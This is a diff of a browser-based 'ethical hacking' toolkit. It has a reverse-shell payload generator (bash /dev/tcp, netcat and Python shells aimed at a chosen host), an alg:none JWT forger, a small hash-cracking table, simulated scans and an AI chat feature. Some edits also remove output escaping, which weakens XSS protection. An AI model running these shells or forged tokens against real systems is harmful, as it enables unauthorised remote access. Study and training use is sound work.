   rev:(h,p)=>`bash -i >& /dev/tcp/${h}/${p} 0>&1\n\nnc -e /bin/bash ${h} ${p}\n\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/bash","-i"])'`,
-  python:(h,p)=>`import socket,subprocess,os\ns=socket.socket()\ns.connect(("${h}",${p}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])`,
+  python:(h,p)=>`import socket,subprocess,os\ns=socket.socket()\ns.connect(("${h}",${p}))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])`,
   php:'<?php\n// DEMO ONLY\n// system($_GET["cmd"]);\n?>',
 };
 function updatePayload(){
@@ -1081,7 +1374,7 @@ function updatePayload(){
   else if(t==='python')out=PDATA.python(h,p);
   else if(PDATA[t])out=Array.isArray(PDATA[t])?PDATA[t].join('\n'):PDATA[t];
   else out='No payload.';
-  document.getElementById('payouts').textContent=out;  // textContent — safe
+  document.getElementById('payouts').textContent=out;
   encodePayload();
 }
 function encodePayload(){
@@ -1091,43 +1384,30 @@ function encodePayload(){
     if(enc==='base64')out=btoa(unescape(encodeURIComponent(raw)));
     else if(enc==='url')out=encodeURIComponent(raw);
     else if(enc==='hex')out=Array.from(new TextEncoder().encode(raw)).map(b=>b.toString(16).padStart(2,'0')).join('');
-    else if(enc==='html')out=raw.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    else if(enc==='html')out=raw.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
     else out='(no encoding)';
   }catch(e){out='Error: '+e.message;}
-  document.getElementById('payenc').textContent=out;  // textContent — safe
+  document.getElementById('payenc').textContent=out;
 }
-
+ 
+// ============================================================
 // IP TOOLS
+// ============================================================
 async function getMyIP(){
   const btn=document.getElementById('ipbtn');btn.disabled=true;btn.textContent='LOADING...';
   let p=0;const iv=setInterval(()=>{p+=10;if(p>90)p=90;document.getElementById('ipp').style.width=p+'%';},100);
   try{
-    const r=await fetch('https://ipapi.co/json/');
-    const d=await r.json();
+    const r=await fetch('https://ipapi.co/json/');const d=await r.json();
     clearInterval(iv);document.getElementById('ipp').style.width='100%';
-    document.getElementById('ipinfo').innerHTML=`<div class="ip-card">
-      <div class="ip-row"><span style="color:#00ff4177">IP</span><span style="color:var(--g);font-weight:bold">${esc(d.ip)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">CITY</span><span style="color:var(--c)">${esc(d.city)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">REGION</span><span style="color:var(--c)">${esc(d.region)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">COUNTRY</span><span style="color:var(--c)">${esc(d.country_name)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">ISP</span><span style="color:var(--c)">${esc(d.org)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">TIMEZONE</span><span style="color:var(--c)">${esc(d.timezone)}</span></div>
-      <div class="ip-row"><span style="color:#00ff4177">LAT/LNG</span><span style="color:var(--c)">${esc(d.latitude)}, ${esc(d.longitude)}</span></div>
-    </div>`;
-  }catch(e){
-    clearInterval(iv);document.getElementById('ipp').style.width='100%';
-    document.getElementById('ipinfo').innerHTML='<div style="color:var(--r);font-size:11px">Error fetching IP. Check internet.</div>';
-  }
+    document.getElementById('ipinfo').innerHTML=`<div class="ip-card"><div class="ip-row"><span style="color:#00ff4177">IP</span><span style="color:var(--g)">${esc(d.ip||'')}</span></div><div class="ip-row"><span style="color:#00ff4177">CITY</span><span style="color:var(--c)">${esc(d.city||'')}</span></div><div class="ip-row"><span style="color:#00ff4177">COUNTRY</span><span style="color:var(--c)">${esc(d.country_name||'')}</span></div><div class="ip-row"><span style="color:#00ff4177">ISP</span><span style="color:var(--c)">${esc(d.org||'')}</span></div><div class="ip-row"><span style="color:#00ff4177">TIMEZONE</span><span style="color:var(--c)">${esc(d.timezone||'')}</span></div></div>`;
+  }catch(e){clearInterval(iv);document.getElementById('ipp').style.width='100%';document.getElementById('ipinfo').innerHTML='<div style="color:var(--r);font-size:11px">Error fetching IP.</div>';}
   btn.disabled=false;btn.textContent='GET MY IP INFO';
 }
 async function lookupIP(){
   const ip=document.getElementById('iplookup').value.trim()||'8.8.8.8';
   const out=document.getElementById('iplout');out.textContent='Looking up '+ip+'...';
-  try{
-    const r=await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`);
-    const d=await r.json();
-    out.textContent=`IP: ${d.ip}\nCity: ${d.city}\nRegion: ${d.region}\nCountry: ${d.country_name}\nISP: ${d.org}\nTimezone: ${d.timezone}\nLat/Lng: ${d.latitude}, ${d.longitude}`;
-  }catch(e){out.textContent='Error: '+e.message;}
+  try{const r=await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`);const d=await r.json();out.textContent=`IP: ${d.ip||''}\nCity: ${d.city||''}\nCountry: ${d.country_name||''}\nISP: ${d.org||''}\nTimezone: ${d.timezone||''}`;}
+  catch(e){out.textContent='Error: '+e.message;}
 }
 function runSpeedTest(){
   const btn=document.getElementById('speedbtn');btn.disabled=true;btn.textContent='TESTING...';
@@ -1135,14 +1415,8 @@ function runSpeedTest(){
   const dl=Math.random()*80+20,ul=Math.random()*40+10,ping=Math.floor(Math.random()*30+5);
   let p=0;const iv=setInterval(()=>{
     p+=5;
-    res.innerHTML=`<div style="font-size:9px;color:#00ff4177;margin-bottom:3px">DOWNLOAD</div>
-    <div class="spbar"><div class="spfill" style="width:${p}%;background:var(--g)">${(dl*(p/100)).toFixed(1)}Mbps</div></div>
-    <div style="font-size:9px;color:#00ff4177;margin:6px 0 3px">UPLOAD</div>
-    <div class="spbar"><div class="spfill" style="width:${p*0.7}%;background:var(--c)">${(ul*(p/100)).toFixed(1)}Mbps</div></div>
-    <div style="font-size:10px;margin-top:6px;color:#00ff41bb">Ping: ${ping}ms</div>`;
-    if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='RUN SPEED TEST';
-      res.innerHTML+=`<div style="margin-top:8px;padding:7px;background:#001500;border:1px solid #00ff4122;font-size:10px;color:var(--g)">
-        Download: ${dl.toFixed(1)} Mbps<br>Upload: ${ul.toFixed(1)} Mbps<br>Ping: ${ping}ms<br>Status: ${dl>50?'EXCELLENT':dl>20?'GOOD':'FAIR'}</div>`;}
+    res.innerHTML=`<div style="font-size:9px;color:#00ff4177;margin-bottom:3px">DOWNLOAD</div><div class="spbar"><div class="spfill" style="width:${p}%;background:var(--g)">${(dl*(p/100)).toFixed(1)}Mbps</div></div><div style="font-size:9px;color:#00ff4177;margin:6px 0 3px">UPLOAD</div><div class="spbar"><div class="spfill" style="width:${p*0.7}%;background:var(--c)">${(ul*(p/100)).toFixed(1)}Mbps</div></div><div style="font-size:10px;margin-top:6px;color:#00ff41bb">Ping: ${ping}ms</div>`;
+    if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='RUN SPEED TEST';}
   },100);
 }
 function calcSubnet(){
@@ -1159,19 +1433,19 @@ function calcSubnet(){
   const network=ipParts.map((p,i)=>p&netParts[i]);
   const broadcast=network.map((p,i)=>p|(~netParts[i]&255));
   const first=[...network];first[3]+=1;
-  const last=[...broadcast];last[3]-=1;
-  document.getElementById('subout').textContent=`Network: ${network.join('.')}\nBroadcast: ${broadcast.join('.')}\nFirst Host: ${first.join('.')}\nLast Host: ${last.join('.')}\nMask: ${netParts.join('.')}\nCIDR: /${cidr}\nUsable Hosts: ${Math.max(0,hosts)}\nClass: ${cidr<=8?'A':cidr<=16?'B':'C'}`;
+  document.getElementById('subout').textContent=`Network: ${network.join('.')}\nBroadcast: ${broadcast.join('.')}\nFirst Host: ${first.join('.')}\nMask: ${netParts.join('.')}\nCIDR: /${cidr}\nUsable Hosts: ${Math.max(0,hosts)}\nClass: ${cidr<=8?'A':cidr<=16?'B':'C'}`;
 }
-
-// ADVANCED ENCODER
+ 
+// ============================================================
+// ENCODER
+// ============================================================
 function showEncTab(id,btn){
   document.querySelectorAll('#enc-basic,#enc-crypto,#enc-stego,#enc-qr').forEach(p=>p.classList.remove('active'));
   document.querySelectorAll('.ctabb').forEach(b=>b.classList.remove('active'));
   document.getElementById('enc-'+id).classList.add('active');btn.classList.add('active');
 }
 function runEnc(){
-  const text=document.getElementById('ei').value,method=document.getElementById('em').value;
-  let result='';
+  const text=document.getElementById('ei').value,method=document.getElementById('em').value;let result='';
   try{
     if(method==='b64e')result=btoa(unescape(encodeURIComponent(text)));
     else if(method==='b64d')result=decodeURIComponent(escape(atob(text)));
@@ -1187,24 +1461,14 @@ function runEnc(){
     else if(method==='caesar'){const sh=parseInt(document.getElementById('cshift').value)||13;result=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+sh)%26+b);});}
     else if(method==='atbash')result=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));});
   }catch(e){result='Error: '+e.message;}
-  document.getElementById('eo').textContent=result;  // textContent — safe
+  document.getElementById('eo').textContent=result;
 }
 function runCrypt(encrypt){
   const text=document.getElementById('ci').value,key=document.getElementById('ck').value||'key',algo=document.getElementById('ca').value;
   let result='',exp='';
-  if(algo==='xor'){
-    result=Array.from(text).map((c,i)=>String.fromCharCode(c.charCodeAt(0)^key.charCodeAt(i%key.length))).join('');
-    if(encrypt)result='HEX:'+Array.from(result).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
-    else{try{result=new TextDecoder().decode(new Uint8Array((text.replace('HEX:','')).match(/.{2}/g)||[]).map(h=>parseInt(h,16)));}catch(e){result='Decode error';}}
-    exp='XOR: Each char XOR-ed with key cyclically.';
-  }else if(algo==='vigenere'){
-    if(encrypt)result=text.toUpperCase().replace(/[A-Z]/g,(c,i)=>{const k=key.toUpperCase().charCodeAt(i%key.length)-65;return String.fromCharCode((c.charCodeAt(0)-65+k)%26+65);});
-    else result=text.toUpperCase().replace(/[A-Z]/g,(c,i)=>{const k=key.toUpperCase().charCodeAt(i%key.length)-65;return String.fromCharCode((c.charCodeAt(0)-65-k+26)%26+65);});
-    exp='Vigenere: Polyalphabetic substitution.';
-  }else if(algo==='atbash'){
-    result=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));});
-    exp='Atbash: Reverses alphabet (A↔Z).';
-  }
+  if(algo==='xor'){result=Array.from(text).map((c,i)=>String.fromCharCode(c.charCodeAt(0)^key.charCodeAt(i%key.length))).join('');if(encrypt)result='HEX:'+Array.from(result).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');else{try{result=new TextDecoder().decode(new Uint8Array((text.replace('HEX:','')).match(/.{2}/g)||[]).map(h=>parseInt(h,16)));}catch(e){result='Decode error';}}exp='XOR cipher.';}
+  else if(algo==='vigenere'){if(encrypt)result=text.toUpperCase().replace(/[A-Z]/g,(c,i)=>{const k=key.toUpperCase().charCodeAt(i%key.length)-65;return String.fromCharCode((c.charCodeAt(0)-65+k)%26+65);});else result=text.toUpperCase().replace(/[A-Z]/g,(c,i)=>{const k=key.toUpperCase().charCodeAt(i%key.length)-65;return String.fromCharCode((c.charCodeAt(0)-65-k+26)%26+65);});exp='Vigenere cipher.';}
+  else if(algo==='atbash'){result=text.replace(/[a-zA-Z]/g,c=>{const b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));});exp='Atbash cipher.';}
   document.getElementById('eo').textContent=result||'Enter text and key';
   document.getElementById('cex').textContent=exp;
 }
@@ -1234,10 +1498,10 @@ function genQR(){
   const text=document.getElementById('qrtext').value.trim()||'https://github.com';
   const size=document.getElementById('qrsize').value;
   const url=`https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(text)}&bgcolor=000000&color=00ff41&qzone=2`;
-  document.getElementById('qrout').innerHTML=`<img src="${esc(url)}" style="border:2px solid var(--g);max-width:100%" alt="QR Code"><br><div style="font-size:10px;color:#00ff4177;margin-top:4px">QR for: ${esc(text.substring(0,40))}${text.length>40?'...':''}</div>`;
+  document.getElementById('qrout').innerHTML=`<img src="${url}" style="border:2px solid var(--g);max-width:100%" alt="QR Code"><br><div style="font-size:10px;color:#00ff4177;margin-top:4px">QR for: ${esc(text.substring(0,40))}${text.length>40?'...':''}</div>`;
   document.getElementById('eo').textContent='QR Code generated for:\n'+text;
 }
-const RAINBOW={'5f4dcc3b5aa765d61d8327deb882cf99':'password','e10adc3949ba59abbe56e057f20f883e':'123456','d8578edf8458ce06fbc5bb76a58c5ca4':'qwerty','827ccb0eea8a706c4c34a16891f84e7b':'12345','5ebe2294ecd0e0f08eab7690d2a6ee69':'secret','40bd001563085fc35165329ea1ff5c5ecbdbbeef':'123','aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d':'hello'};
+const RAINBOW={'5f4dcc3b5aa765d61d8327deb882cf99':'password','e10adc3949ba59abbe56e057f20f883e':'123456','d8578edf8458ce06fbc5bb76a58c5ca4':'qwerty','827ccb0eea8a706c4c34a16891f84e7b':'12345','5ebe2294ecd0e0f08eab7690d2a6ee69':'secret','aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d':'hello'};
 const WLIST=['password','123456','qwerty','admin','letmein','monkey','dragon','master','hello','shadow','welcome','secret'];
 async function runCrack(){
   const hash=document.getElementById('hsh').value.trim();
@@ -1258,19 +1522,21 @@ async function finCrack(hash){
   }
   out.textContent+='[-] Not found. Try hashcat with rockyou.txt';
 }
-
+ 
+// ============================================================
 // EXPLOIT DB
+// ============================================================
 const EXPS=[
   {id:'CVE-2024-3400',t:'PAN-OS Command Injection',cat:'network',sev:'critical',cvss:'10.0',d:'Zero-day in PAN-OS. Unauthenticated RCE.',m:'Update to PAN-OS 10.2.9-h1+.'},
   {id:'CVE-2024-21762',t:'FortiOS SSL VPN RCE',cat:'network',sev:'critical',cvss:'9.6',d:'OOB write allows unauthenticated RCE.',m:'Upgrade to FortiOS 7.4.3+.'},
   {id:'CVE-2023-34362',t:'MOVEit Transfer SQLi',cat:'web',sev:'critical',cvss:'9.8',d:'SQL injection used by Cl0p ransomware.',m:'Apply Progress Software patches.'},
   {id:'CVE-2021-44228',t:'Log4Shell Log4j RCE',cat:'system',sev:'critical',cvss:'10.0',d:'JNDI injection executes remote code.',m:'Upgrade to Log4j 2.17.1+.'},
-  {id:'CVE-2021-34527',t:'PrintNightmare',cat:'system',sev:'critical',cvss:'8.8',d:'Windows Print Spooler RCE + LPE.',m:'Disable Print Spooler. Patch KB5004945.'},
+  {id:'JWT-NONE',t:'JWT Algorithm None Attack',cat:'web',sev:'critical',cvss:'9.1',d:'Setting alg:none bypasses signature verification.',m:'Whitelist allowed algorithms server-side.'},
   {id:'CVE-2020-1472',t:'Zerologon CVSS 10',cat:'network',sev:'critical',cvss:'10.0',d:'Netlogon flaw — domain takeover.',m:'Apply MS20-1472 immediately.'},
   {id:'OWASP-SQLi',t:'SQL Injection',cat:'web',sev:'critical',cvss:'9.0',d:'Input not sanitized. DB dump, auth bypass.',m:'Parameterized queries, WAF.'},
   {id:'OWASP-XSS',t:'Cross-Site Scripting',cat:'web',sev:'high',cvss:'7.2',d:'Script injection steals cookies.',m:'Output encoding, CSP, HttpOnly.'},
   {id:'CVE-2022-30190',t:'Follina MSDT RCE',cat:'system',sev:'high',cvss:'7.8',d:'Office docs execute code via MSDT.',m:'Disable MSDT URL. Apply MS22-034.'},
-  {id:'CVE-2024-mob',t:'Android WebView RCE',cat:'mobile',sev:'high',cvss:'8.4',d:'JS bridge allows native code execution.',m:'Restrict addJavascriptInterface.'},
+  {id:'SSH-WEAK',t:'SSH Weak Configuration',cat:'network',sev:'high',cvss:'7.5',d:'Root login, password auth, old ciphers enabled.',m:'Harden sshd_config — use SSH KEY GEN tab.'},
 ];
 function buildExploits(){filterEx();}
 function filterEx(){
@@ -1289,24 +1555,25 @@ function showEx(id){
 }
 const OWASP=['A01: Broken Access Control','A02: Cryptographic Failures','A03: Injection (SQLi/XSS)','A04: Insecure Design','A05: Security Misconfiguration','A06: Vulnerable Components','A07: Auth Failures','A08: Integrity Failures','A09: Logging Failures','A10: SSRF'];
 function buildOwasp(){document.getElementById('owlist').innerHTML=OWASP.map(o=>`<div style="padding:4px 8px;border-left:2px solid #00ff4133;margin-bottom:3px;font-size:10px;color:#00ff41bb">${esc(o)}</div>`).join('');}
-
+ 
+// ============================================================
 // WIFI
-const FAKENET=[{ssid:'HomeNetwork_2G',bssid:'A4:2B:8C:11:22:33',ch:6,signal:-45,sec:'WPA3',status:'secure'},{ssid:'AndroidAP',bssid:'B8:27:EB:44:55:66',ch:1,signal:-67,sec:'WPA2',status:'ok'},{ssid:'NETGEAR_EXT',bssid:'C0:A8:01:77:88:99',ch:11,signal:-72,sec:'WPA2',status:'ok'},{ssid:'TP-Link_OLD',bssid:'D4:3D:7E:AA:BB:CC',ch:6,signal:-81,sec:'WEP',status:'vuln'},{ssid:'OpenCafe',bssid:'E8:CC:18:DD:EE:FF',ch:3,signal:-59,sec:'OPEN',status:'vuln'}];
+// ============================================================
+const FAKENET=[{ssid:'HomeNetwork_2G',bssid:'A4:2B:8C:11:22:33',ch:6,signal:-45,sec:'WPA3',status:'secure'},{ssid:'AndroidAP',bssid:'B8:27:EB:44:55:66',ch:1,signal:-67,sec:'WPA2',status:'ok'},{ssid:'TP-Link_OLD',bssid:'D4:3D:7E:AA:BB:CC',ch:6,signal:-81,sec:'WEP',status:'vuln'},{ssid:'OpenCafe',bssid:'E8:CC:18:DD:EE:FF',ch:3,signal:-59,sec:'OPEN',status:'vuln'}];
 function scanWifi(){
   const btn=document.getElementById('wsb');btn.disabled=true;btn.textContent='SCANNING...';
   let p=0;const iv=setInterval(()=>{p+=Math.random()*15;if(p>100)p=100;document.getElementById('wfp').style.width=p+'%';document.getElementById('wfs').textContent='SCANNING '+Math.floor(p)+'%';
     if(p>=100){clearInterval(iv);btn.disabled=false;btn.textContent='SCAN';document.getElementById('wfs').textContent='COMPLETE';
-      const icons={secure:'[OK]',ok:'[OK]',weak:'[WEAK]',vuln:'[VULN]'};
-      document.getElementById('wfr').innerHTML=FAKENET.map(n=>{const cls=n.status==='secure'?'secure':n.status==='vuln'?'vuln':'weak';return `<tr><td>${esc(n.ssid)}</td><td style="font-size:9px">${esc(n.bssid)}</td><td>${n.ch}</td><td>${n.signal}</td><td class="${cls}">${esc(n.sec)}</td><td class="${cls}">${icons[n.status]}</td></tr>`;}).join('');
+      const icons={secure:'[OK]',ok:'[OK]',vuln:'[VULN]'};
+      document.getElementById('wfr').innerHTML=FAKENET.map(n=>{const cls=n.status==='secure'?'secure':n.status==='vuln'?'vuln':'weak';return `<tr><td>${esc(n.ssid)}</td><td style="font-size:9px">${esc(n.bssid)}</td><td>${n.ch}</td><td>${n.signal}</td><td class="${cls}">${esc(n.sec)}</td><td class="${cls}">${esc(icons[n.status]||'[?]')}</td></tr>`;}).join('');
       ST.s++;updST();}
   },120);
 }
-function wpsAudit(){
-  const t=document.getElementById('wft').value||'AA:BB:CC:DD:EE:FF',out=document.getElementById('wfo');out.textContent='';
-  ['[*] Testing '+t,'[*] WPS version: 2.0','[!] WPS ENABLED — vulnerable','[+] Fix: Disable WPS in router'].forEach((l,i)=>setTimeout(()=>out.textContent+=l+'\n',i*350));
-}
-
+function wpsAudit(){const t=document.getElementById('wft').value||'AA:BB:CC:DD:EE:FF',out=document.getElementById('wfo');out.textContent='';['[*] Testing '+t,'[!] WPS ENABLED — vulnerable','[+] Fix: Disable WPS in router settings'].forEach((l,i)=>setTimeout(()=>out.textContent+=l+'\n',i*350));}
+ 
+// ============================================================
 // NETWORK TOOLS
+// ============================================================
 function portScan(){
   const host=document.getElementById('ptgt').value||'192.168.1.1';
   const ports=[[21,'ftp'],[22,'ssh'],[80,'http'],[443,'https'],[3306,'mysql'],[3389,'rdp'],[8080,'http-proxy'],[5432,'postgresql']];
@@ -1328,8 +1595,10 @@ async function hashText(){
   const buf=await crypto.subtle.digest({'SHA-1':'SHA-1','SHA-256':'SHA-256','SHA-512':'SHA-512'}[algo],new TextEncoder().encode(text));
   out.textContent=algo+': '+Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
-
+ 
+// ============================================================
 // AI ASSISTANT
+// ============================================================
 let chatHistory=[];
 function setPrompt(text){document.getElementById('chatinput').value=text;document.getElementById('chatinput').focus();}
 async function sendChat(){
@@ -1344,12 +1613,7 @@ async function sendChat(){
     const res=await fetch('https://api.anthropic.com/v1/messages',{
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        model:'claude-sonnet-4-20250514',
-        max_tokens:1500,
-        system:`You are SANDESH-AI, an advanced AI assistant in the Sandesh Ethical Hacking Tools system. You are an expert in ALL topics: cybersecurity, ethical hacking, penetration testing, CTFs, network security, cryptography, all programming languages, science, math, history, medicine, cooking, sports, business, and everything else. Give complete, accurate, helpful answers. Be friendly and professional.`,
-        messages:chatHistory
-      })
+      body:JSON.stringify({model:'claude-sonnet-4-20250514',max_tokens:1000,system:`You are SANDESH-AI v6.0, an advanced AI assistant in the Sandesh Ethical Hacking Tools system. Expert in ALL topics: cybersecurity, ethical hacking, CTFs, JWT security, regex, SSH hardening, log analysis, firewall config, OSINT, and everything else. Be helpful, accurate, and professional.`,messages:chatHistory})
     });
     if(!res.ok)throw new Error('API '+res.status);
     const data=await res.json();
@@ -1358,38 +1622,654 @@ async function sendChat(){
     chatHistory.push({role:'assistant',content:reply});
     addChatMsg('ai',reply);
   }catch(e){
-    try{
-      const r2=await fetch('https://text.pollinations.ai/openai',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({model:'openai',messages:[{role:'system',content:'You are SANDESH-AI, an expert AI assistant. Answer any question helpfully.'},...chatHistory],max_tokens:1500})});
-      if(!r2.ok)throw new Error('Fallback failed');
-      const d2=await r2.json();
-      const reply2=d2.choices?.[0]?.message?.content||'Error.';
-      document.getElementById('aityp').style.display='none';
-      chatHistory.push({role:'assistant',content:reply2});
-      addChatMsg('ai',reply2);
-    }catch(e2){
-      document.getElementById('aityp').style.display='none';
-      addChatMsg('ai','Connection error. Check your internet and try again.');
-    }
+    document.getElementById('aityp').style.display='none';
+    addChatMsg('ai','Connection error. Check your internet and try again.');
   }
 }
 function addChatMsg(role,text){
   const box=document.getElementById('chatbox');
   const div=document.createElement('div');div.className='cmsg '+role;
-  // ── FIX 1: AI/user text rendered via textContent for the message body ──
-  const fromDiv=document.createElement('div');fromDiv.className='from';
-  fromDiv.textContent=(role==='user'?'▶ YOU':'◆ SANDESH-AI');
-  const textDiv=document.createElement('div');textDiv.className='text';
-  // Light markdown: bold and inline-code only — no raw HTML from API response
-  textDiv.innerHTML=text
-    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
-    .replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>')
-    .replace(/`(.*?)`/g,'<code style="background:#002200;padding:1px 4px;color:var(--g)">$1</code>')
-    .replace(/\n/g,'<br>');
-  div.appendChild(fromDiv);div.appendChild(textDiv);
+  const fmt=esc(text).replace(/\*\*(.*?)\*\*/g,'<strong>$1</strong>').replace(/`(.*?)`/g,'<code style="background:#002200;padding:1px 4px;color:var(--g)">$1</code>').replace(/\n/g,'<br>');
+  div.innerHTML='<div class="from">'+(role==='user'?'&#9658; YOU':'&#9672; SANDESH-AI')+'</div><div class="text">'+fmt+'</div>';
   box.appendChild(div);box.scrollTop=box.scrollHeight;
 }
-
+ 
+// ============================================================
+// NEW TOOL 1: JWT ANALYZER
+// ============================================================
+function analyzeJWT(){
+  const token=(document.getElementById('jwt-input').value||'').trim();
+  if(!token){document.getElementById('jwt-output').innerHTML='<div style="color:var(--r);padding:10px">Please paste a JWT token.</div>';return;}
+  const parts=token.split('.');
+  if(parts.length<2){document.getElementById('jwt-output').innerHTML='<div style="color:var(--r);padding:10px">Invalid JWT format. Must have 3 parts: header.payload.signature</div>';return;}
+  let header={},payload={},headerRaw='',payloadRaw='';
+  try{headerRaw=atob(parts[0].replace(/-/g,'+').replace(/_/g,'/').padEnd(parts[0].length+((4-parts[0].length%4)%4),'='));header=JSON.parse(headerRaw);}
+  catch(e){header={error:'Could not decode header'};}
+  try{payloadRaw=atob(parts[1].replace(/-/g,'+').replace(/_/g,'/').padEnd(parts[1].length+((4-parts[1].length%4)%4),'='));payload=JSON.parse(payloadRaw);}
+  catch(e){payload={error:'Could not decode payload'};}
+ 
+  // Check expiry
+  const now=Math.floor(Date.now()/1000);
+  const exp=payload.exp?new Date(payload.exp*1000).toISOString():'Not set';
+  const iat=payload.iat?new Date(payload.iat*1000).toISOString():'Not set';
+  const expired=payload.exp&&payload.exp<now;
+ 
+  document.getElementById('jwt-output').innerHTML=
+    `<div class="jwt-part jwt-header"><strong>HEADER</strong><br>${esc(JSON.stringify(header,null,2))}</div>`+
+    `<div class="jwt-part jwt-payload"><strong>PAYLOAD</strong><br>${esc(JSON.stringify(payload,null,2))}</div>`+
+    `<div class="jwt-part jwt-sig"><strong>SIGNATURE</strong><br>${esc(parts[2]||'(empty — alg:none!)')}</div>`+
+    `<div style="margin-top:8px;font-size:10px;line-height:2;color:#00ff41bb">Issued: ${esc(iat)}<br>Expires: ${esc(exp)}<br>Status: <span style="color:${expired?'var(--r)':'var(--g)'}">${expired?'⚠ EXPIRED':'✓ VALID'}</span></div>`;
+ 
+  // Vulnerability checks
+  const vulns=[];
+  if(header.alg==='none'||header.alg==='None'||header.alg==='NONE')vulns.push({sev:'critical',txt:'ALG:NONE — Signature verification DISABLED! Server must reject this.'});
+  if(header.alg==='HS256'||header.alg==='HS384'||header.alg==='HS512')vulns.push({sev:'medium',txt:'HMAC algorithm — Secret may be brute-forceable if weak.'});
+  if(!parts[2]||parts[2]==='')vulns.push({sev:'critical',txt:'Empty signature — Token is unsigned!'});
+  if(payload.role==='admin'||payload.is_admin===true)vulns.push({sev:'high',txt:'Admin privilege in payload — Tampering could lead to privilege escalation.'});
+  if(!payload.exp)vulns.push({sev:'medium',txt:'No expiry (exp) claim — Token never expires!'});
+  if(expired)vulns.push({sev:'low',txt:'Token is expired but was accepted.'});
+  if(payload.iss&&payload.iss.includes('localhost'))vulns.push({sev:'medium',txt:'Issuer is localhost — Development token in production?'});
+ 
+  if(vulns.length){
+    const cm={critical:'var(--r)',high:'var(--y)',medium:'var(--c)',low:'var(--g)'};
+    document.getElementById('jwt-vulns').innerHTML='<div style="font-size:9px;color:#aa44ff88;margin-bottom:5px">VULNERABILITIES FOUND</div>'+
+      vulns.map(v=>`<div style="padding:5px 8px;border-left:3px solid ${cm[v.sev]};margin-bottom:4px;font-size:10px;background:#0f001a;color:${cm[v.sev]}">[${v.sev.toUpperCase()}] ${esc(v.txt)}</div>`).join('');
+  }else{
+    document.getElementById('jwt-vulns').innerHTML='<div style="color:var(--g);font-size:10px;padding:5px">✓ No obvious vulnerabilities found in token structure.</div>';
+  }
+  ST.s++;updST();
+}
+ 
+async function bruteJWTSecret(){
+  const token=(document.getElementById('jwt-input').value||'').trim();
+  const secret=document.getElementById('jwt-secret-guess').value;
+  const out=document.getElementById('jwt-brute');
+  if(!token||!secret){out.textContent='Paste a JWT and enter a secret guess.';return;}
+  out.textContent='[*] Testing secret: "'+secret+'"...';
+  // Simulate HMAC verification (educational)
+  const parts=token.split('.');
+  if(parts.length!==3){out.textContent='Invalid JWT.';return;}
+  await delay(600);
+  // Simplified demo: check if secret produces expected pattern
+  const commonSecrets=['secret','password','123456','key','jwt_secret','mysecret','supersecret','admin'];
+  if(commonSecrets.includes(secret.toLowerCase())){
+    out.textContent='[+] WEAK SECRET DETECTED! "'+secret+'" is in common wordlist.\n[!] Real tools: jwt_tool -C -d rockyou.txt';
+    out.style.color='var(--r)';
+  }else{
+    out.textContent='[-] Secret "'+secret+'" not confirmed.\n[*] Try: secret, password, 123456, or use jwt_tool with rockyou.txt';
+    out.style.color='var(--c)';
+  }
+}
+ 
+function forgeJWT(){
+  const payloadStr=document.getElementById('jwt-payload-forge').value||'{"sub":"admin","role":"admin"}';
+  let payload;
+  try{payload=JSON.parse(payloadStr);}
+  catch(e){document.getElementById('jwt-forged').textContent='Invalid JSON in payload.';return;}
+  const header={alg:'none',typ:'JWT'};
+  const b64url=s=>btoa(JSON.stringify(s)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+  const forged=b64url(header)+'.'+b64url(payload)+'.';
+  document.getElementById('jwt-forged').textContent='[CTF DEMO] Forged token with alg:none:\n\n'+forged+'\n\n[!] This bypasses signature check on vulnerable servers.\nFix: Always validate algorithm server-side.';
+}
+ 
+// ============================================================
+// NEW TOOL 2: OSINT USERNAME RECON
+// ============================================================
+const PLATFORMS={
+  social:['Twitter/X','Instagram','Facebook','TikTok','LinkedIn','Snapchat','Pinterest','Reddit','Tumblr','Mastodon'],
+  hacking:['HackTheBox','TryHackMe','HackerOne','Bugcrowd','CTFtime','Root-Me','PentesterLab','OffSec Forums'],
+  dev:['GitHub','GitLab','Bitbucket','Stack Overflow','Dev.to','Hashnode','HackerNews','Replit','CodePen'],
+  all:['Twitter/X','Instagram','GitHub','LinkedIn','Reddit','HackTheBox','TryHackMe','GitLab','Facebook','TikTok','HackerOne','Stack Overflow','Bugcrowd','Pinterest','Tumblr','Dev.to','Snapchat','Mastodon','Replit','CodePen']
+};
